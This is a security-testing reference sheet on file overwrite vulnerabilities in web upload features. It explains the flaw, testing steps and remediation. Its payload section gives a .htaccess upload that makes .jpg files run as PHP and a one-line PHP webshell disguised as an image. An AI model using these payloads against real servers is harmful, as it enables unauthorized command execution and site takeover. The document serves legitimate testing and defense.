# File Overwrite

## Overview
File overwrite vulnerabilities occur when an attacker can upload a file using a filename that already exists on the server, causing the original file to be replaced. If the original file is an application script, configuration file, or `.htaccess`, the replacement can lead to code execution, configuration tampering, or denial of service.

## How It Works
- The server saves uploaded files using the original or a predictable filename without checking for collisions.
- If an attacker knows or can predict an existing filename, they upload a malicious replacement.
- Race conditions may also allow two requests to overwrite each other's files.
- On some servers, overwriting `.htaccess` can enable PHP execution in the upload directory.

## Impact
- Replace application source files with malicious versions (webshell injection).
- Overwrite `.htaccess` to enable execution of scripts in upload directories.
- Replace configuration files with attacker-controlled content.
- Overwrite other users' uploaded files (data corruption/privacy violation).

## Where to Look
- Upload features where the stored filename is predictable or user-controlled.
- Applications that store files with the user-supplied original filename.
- Avatar/profile picture uploads where the filename is the user ID or a predictable hash.
- Document management systems with predictable document names.

## Testing Steps
1. Upload a file with a known name (e.g., `test.txt`).
2. Upload a second file with the same name — check if the first is overwritten.
3. Try to overwrite well-known files: `index.php`, `.htaccess`, `config.php`, `robots.txt`.
4. Upload `.htaccess` with `AddType application/x-httpd-php .jpg` to enable PHP in upload dir.
5. Then upload a `.jpg` webshell and execute it.
6. Check if file ownership/permission prevents overwrite (race condition window).

## Payloads / Techniques
```http
# Upload a .htaccess to enable PHP execution of .jpg files
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .jpg
------Boundary--
```

```http
# Then upload a PHP webshell disguised as JPG
------Boundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

## Burp Suite Tips
- In **Repeater**, change filenames to known server-side files and observe if overwrite occurs.
- Use **Intruder** to try a wordlist of common filenames (`.htaccess`, `index.php`, `web.config`).

## Tools
- Burp Suite Repeater / Intruder
- curl for rapid sequential upload testing

## Remediation
- Generate a random UUID or hash-based filename server-side — never use the user-supplied name as the storage key.
- Implement collision detection: check if the target file already exists before writing.
- Apply filesystem permissions so the web process cannot overwrite application files.
- Store uploads in a separate directory outside the web root, serving them via a file-serving endpoint.

## References
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
